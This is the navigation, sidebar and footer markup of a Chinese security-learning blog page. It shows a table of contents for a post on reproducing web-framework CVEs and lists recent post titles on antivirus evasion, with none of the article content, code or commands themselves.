服务攻防-框架安全&amp;CVE复现&amp;Django&amp;Flask&amp;Node.JS&amp;JQuery</div></div></a></div><div class="next-post pull-right"><a href="/2023/03/12/Day61-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-K8s-Docker-Jetty-Websphere/" title="Day61 服务攻防-中间件安全&amp;CVE复现&amp;K8s&amp;Docker&amp;Jetty&amp;Websphere"><img class="cover" src="https://pic4.zhimg.com/80/v2-262b2d2fe6f31639f379414bda2a76fb_1440w.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Day61 服务攻防-中间件安全&amp;CVE复现&amp;K8s&amp;Docker&amp;Jetty&amp;Websphere</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/tt.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">pwy</div><div class="author-info__description">自律&上进</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">76</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">#知识点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E8%AF%AD%E8%A8%80%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">常见语言开发框架：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%A0%E8%8A%82%E5%86%85%E5%AE%B9%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">#章节内容：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">#前置知识：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B%EF%BC%9A%E8%A7%81%E5%9B%BE"><span class="toc-number">5.</span> <span class="toc-text">-应用服务安全测试流程：见图</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B%EF%BC%9A"><span class="toc-number">6.</span> <span class="toc-text">-开发框架组件安全测试流程：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A"><span class="toc-number">7.</span> <span class="toc-text">演示案例：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP-%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-Thinkphp-amp-Laravel"><span class="toc-number">7.1.</span> <span class="toc-text">#PHP-开发框架安全-Thinkphp&amp;Laravel</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JAVAWEB-%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-Spring-amp-Struts2"><span class="toc-number">7.2.</span> <span class="toc-text">#JAVAWEB-开发框架安全-Spring&amp;Struts2</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Struts2%E6%98%AF%E4%B8%80%E4%B8%AA%E5%9F%BA%E4%BA%8EMVC%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E7%9A%84Web%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6"><span class="toc-number">7.2.1.</span> <span class="toc-text">Struts2是一个基于MVC设计模式的Web应用框架</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1%E3%80%812020%E5%89%8D%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.2.1.1.</span> <span class="toc-text">1、2020前漏洞</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2%E3%80%81cve-2020-17530"><span class="toc-number">7.2.1.2.</span> <span class="toc-text">2、cve_2020_17530</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Spring%E6%A1%86%E6%9E%B6%E6%98%AF%E7%94%B1%E4%BA%8E%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E7%9A%84%E5%A4%8D%E6%9D%82%E6%80%A7%E8%80%8C%E5%88%9B%E5%BB%BA%E7%9A%84%E3%80%82"><span class="toc-number">7.2.2.</span> <span class="toc-text">Spring框架是由于软件开发的复杂性而创建的。</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1%E3%80%81cve-2017-4971-Spring-Web-Flow"><span class="toc-number">7.2.2.1.</span> <span class="toc-text">1、cve_2017_4971-Spring Web Flow</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2%E3%80%81cve-2018-1273-Spring-Data-Commons"><span class="toc-number">7.2.2.2.</span> <span class="toc-text">2、cve_2018_1273-Spring Data Commons</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3%E3%80%81CVE-2022-22963-Spring-Cloud-Function-Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5"><span class="toc-number">7.2.2.3.</span> <span class="toc-text">3、CVE-2022-22963 Spring Cloud Function Spel表达式注入</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/12/hello-world/" title="Hello World">Hello World</a><time datetime="2023-05-12T15:24:14.066Z" title="发表于 2023-05-12 23:24:14">2023-05-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/04/27/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/" title="Day113 免杀对抗-内存加载&amp;API封装&amp;UUID标识&amp;MAC地址&amp;IPV4地址&amp;各语言">Day113 免杀对抗-内存加载&amp;API封装&amp;UUID标识&amp;MAC地址&amp;IPV4地址&amp;各语言</a><time datetime="2023-04-27T00:35:05.000Z" title="发表于 2023-04-27 08:35:05">2023-04-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/04/27/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/" title="Day112 免杀对抗-加载器分离&amp;无文件落地&amp;图片隐写&amp;SOCK管道&amp;参数协议化">Day112 免杀对抗-加载器分离&amp;无文件落地&amp;图片隐写&amp;SOCK管道&amp;参数协议化</a><time datetime="2023-04-27T00:34:45.000Z" title="发表于 2023-04-27 08:34:45">2023-04-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/04/27/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/" title="Day111 免杀对抗-Java&amp;ASM&amp;汇编CS调用&amp;内联C&amp;MSF源码特征修改&amp;Jar打包">Day111 免杀对抗-Java&amp;ASM&amp;汇编CS调用&amp;内联C&amp;MSF源码特征修改&amp;Jar打包</a><time datetime="2023-04-27T00:34:28.000Z" title="发表于 2023-04-27 08:34:28">2023-04-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/04/27/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/" title="Day110 免杀对抗-GO&amp;C#&amp;反VT沙盒&amp;逆向调试&amp;参数加载&amp;资源分离&amp;混淆加密">Day110 免杀对抗-GO&amp;C#&amp;反VT沙盒&amp;逆向调试&amp;参数加载&amp;资源分离&amp;混淆加密</a><time datetime="2023-04-27T00:34:13.000Z" title="发表于 2023-04-27 08:34:13">2023-04-27</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By pwy</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
